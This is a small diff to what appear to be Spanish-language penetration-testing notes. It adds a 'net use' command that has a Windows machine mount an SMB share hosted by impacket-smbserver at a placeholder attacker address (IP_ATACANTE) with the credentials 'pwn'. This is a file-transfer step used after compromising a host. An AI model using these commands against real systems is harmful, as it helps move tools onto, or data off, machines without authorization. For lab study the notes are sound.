@@ -20,3 +20,4 @@ impacket-smbserver SMBfolder $(pwd) -smb2support
 ```
 impacket-smbserver SMBfolder $(pwd) -smb2support -username pwn -password pwn
 ```
+> Desde la maquina Windows: net use \\IP_ATACANTE\SMBfolder /user:pwn pwn
